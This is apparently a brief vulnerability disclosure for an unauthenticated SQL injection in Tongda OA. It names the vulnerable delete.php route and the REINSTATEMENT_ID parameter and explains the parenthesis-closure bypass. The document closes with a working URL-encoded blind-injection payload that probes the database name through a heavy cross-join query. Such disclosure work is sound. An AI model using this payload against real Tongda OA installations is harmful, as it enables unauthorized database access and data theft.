Unauthorized SQL injection vulnerability exists in Tongda OA

version:Less than v11.10 or v2017

Route: general/hr/manage/staff_reinstatement/delete.php

There is an injected parameter: $REINSTATEMENT_ID

The code is neat here, concatenating the parameters directly into the SQL statement when the $REINSTATEMENT_ID is not empty, and there is a bypass because of the parenthesis closure.
![WPS图片(1)](https://github.com/ggg48966/cve/assets/51871401/a2a32380-ef1b-4a10-9557-b41609eb10cb)

poc
```
1)%20and%20(substr(DATABASE(),1,1))=char(116)%20and%20(select%20count(*)%20from%20information_schema.columns%20A,information_schema.columns%20B)%20and(1)=(1
```
![WPS图片(2)](https://github.com/ggg48966/cve/assets/51871401/abf12677-f426-40a0-b454-be60888c7f20)
